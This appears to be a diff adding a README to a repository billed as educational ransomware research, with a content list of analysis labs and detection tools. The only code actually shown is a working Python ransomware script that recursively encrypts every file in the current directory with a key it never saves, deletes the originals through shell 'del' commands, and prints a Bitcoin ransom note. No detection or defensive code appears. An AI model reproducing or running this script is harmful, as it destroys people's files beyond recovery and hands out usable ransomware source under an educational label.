@@ -1,0 +1,71 @@
+This repository explores the structure, behavior, detection, and prevention of ransomware attacks. It includes hands-on simulations (for educational purposes), malware analysis labs, and tools for threat detection and response.
+
+🔍 Contents:
+🧬 Ransomware Behavior Analysis (Static & Dynamic)
+
+🔐 Encryption Techniques Used by Ransomware
+
+🛠️ Detection & Response Scripts (Python, YARA, Sysmon, etc.)
+
+🧪 Lab Environments for Safe Ransomware Testing (VirtualBox, Remnux, FLARE VM)
+
+⚙️ Defensive Tools (EDR/AV Bypass Testing, Network Monitoring)
+
+📚 Research Papers & IOC Collections
+
+📝 Ransomware Families Case Studies (e.g., WannaCry, Ryuk, LockBit)
+
+
+
+import os
+from cryptography.fernet import Fernet
+import subprocess
+
+# Generate a key for encryption
+key = Fernet.generate_key()
+cipher = Fernet(key)
+
+# Get the current directory
+current_dir = os.getcwd()
+
+# Encrypt all files in the current directory
+for root, dirs, files in os.walk(current_dir):
+    for file in files:
+        file_path = os.path.join(root, file)
+        
+        # Skip the script file itself
+        if file_path == os.path.abspath(__file__):
+            continue
+        
+        # Read the file data
+        with open(file_path, 'rb') as f:
+            file_data = f.read()
+        
+        # Encrypt the file data
+        encrypted_data = cipher.encrypt(file_data)
+        
+        # Create a new encrypted file
+        encrypted_file_path = file_path + '.encrypted'
+        with open(encrypted_file_path, 'wb') as f:
+            f.write(encrypted_data)
+        
+        # Delete the original file
+        for file in files:
+            cmd = "del " + f'"{file_path}"'
+            print(cmd)  
+            try:
+                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                if result.returncode == 0:
+                    print("Command executed successfully.")
+                    print("Output:")
+                    print(result.stdout)
+                else:
+                    print("Command execution failed.")
+                    print("Error Output:")
+                    print(result.stderr)
+            except Exception as e:
+                print(f"Error occurred while running the command: {e}")
+
+# Display the ransom note
+print("All your files have been encrypted!")
+print("To decrypt your files, send us 0.1 Bitcoin to the address: 123BitcoinAddress")
